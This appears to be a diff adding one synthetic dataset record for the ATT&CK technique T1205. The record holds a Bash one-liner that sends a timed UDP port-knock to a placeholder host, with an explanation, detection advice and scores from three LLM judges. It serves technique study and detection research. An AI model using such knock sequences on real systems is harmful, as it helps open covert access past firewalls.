@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "for p in 10101 20202 30303; do echo -n X > /dev/udp/198.51.100.40/$p; sleep 0.25; done",
+  "explanation": "Uses Bash's /dev/udp pseudo-device to send a timed UDP knock sequence without external tools; a remote knockd-like listener can treat these as triggers. Detection: look for repeated UDP writes from shells to closed ports and correlate with subsequent firewall changes.",
+  "rationale_steps": [
+    "Send minimal UDP datagrams to three ports in order using Bash's /dev/udp.",
+    "Remote listener correlates the sequence and updates firewall to permit access.",
+    "Operator then attempts connection to the service exposed by the signal.",
+    "Defenders can detect bursty UDP hits to closed ports and audit shell histories for /dev/udp usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4e50b45e-34342014",
+  "source_prompt_hash": "4e50b45e",
+  "timestamp_utc": "2025-09-30T05:51:10.007150Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash for-loop with correct separators, valid /dev/udp redirection, and no quoting or flag issues.",
+        "semantic_score": 5,
+        "semantic_justification": "Sends timed UDP packets to a sequence of ports via Bash\u2019s /dev/udp, effectively implementing a port-knock style traffic signaling consistent with T1205.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T12:44:43.063083Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper loop syntax, balanced quotes, valid redirection to /dev/udp, and correct use of command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by sending timed UDP packets to specific ports (10101, 20202, 30303) that could serve as a knock sequence to trigger actions on a listening server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T12:44:45.817656Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing standard Bash `for` loop syntax, correct command separators, and the valid `/dev/udp` pseudo-device for network redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements a timed UDP knock sequence, which directly aligns with T1205 Traffic Signaling's description of using timing patterns and sequence-based triggers to coordinate actions or trigger payloads.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T12:44:55.984745Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
